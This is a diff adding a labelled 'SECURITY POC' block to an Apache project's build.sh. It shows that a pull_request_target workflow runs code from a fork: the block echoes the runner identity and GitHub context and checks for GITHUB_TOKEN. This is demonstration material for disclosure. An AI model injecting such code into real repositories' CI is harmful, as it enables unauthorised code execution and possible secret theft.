@@ -1,4 +1,18 @@
 #!/usr/bin/env bash
+# SECURITY POC — This demonstrates code execution via pull_request_target
+# This code runs because build.sh is executed from attacker's fork checkout
+echo "============================================================"
+echo "SECURITY POC — CODE EXECUTION VIA BUILD.SH"
+echo "============================================================"
+echo "whoami: $(whoami)"
+echo "hostname: $(hostname)"
+echo "pwd: $(pwd)"
+echo "GITHUB_REPOSITORY: ${GITHUB_REPOSITORY}"
+echo "GITHUB_WORKFLOW: ${GITHUB_WORKFLOW}"
+echo "GITHUB_ACTOR: ${GITHUB_ACTOR}"
+echo "GITHUB_EVENT_NAME: ${GITHUB_EVENT_NAME}"
+echo "GITHUB_TOKEN set: $(if [ -n "${GITHUB_TOKEN}" ]; then echo "YES (length=${#GITHUB_TOKEN})"; else echo "NO"; fi)"
+echo "============================================================"
 # Licensed to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
 # distributed with this work for additional information
